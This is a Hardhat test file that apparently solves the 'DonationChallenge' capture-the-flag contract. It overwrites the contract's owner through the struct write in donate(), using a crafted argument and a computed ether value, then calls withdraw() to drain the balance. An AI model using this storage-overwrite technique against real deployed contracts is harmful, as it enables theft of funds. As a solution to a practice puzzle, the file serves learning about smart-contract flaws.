const { expect } = require("chai");
const { ethers } = require("hardhat");

describe.only("DonationChallenge", async function () {
    let contract;

    before(async function () {
        contract = await (await ethers.getContractFactory("DonationChallenge")).deploy({ value: ethers.utils.parseEther("1") });
    });

    it("Exploit", async function () {
        // WRITE YOUR CODE HERE

        // We convert the signer's address to number so we can replace the `owner` with it
        // `donation` is stored directly in storage so its second property `etherAmount` will actually take place in the second storage slot
        const signerAddressToBigNumber = ethers.BigNumber.from((await ethers.getSigner()).address);

        const scale = ethers.BigNumber.from(10).pow(18).pow(2);
        const requiredMsgValue = signerAddressToBigNumber.div(scale);

        await contract.donate(signerAddressToBigNumber, { value: requiredMsgValue });

        // Make sure the attack worked
        expect(await contract.owner()).to.equal((await ethers.getSigner()).address);

        // Take all funds to current signer's account balance
        await contract.withdraw();
    });

    after(async function () {
        expect(await contract.isComplete()).to.be.true;
    });
});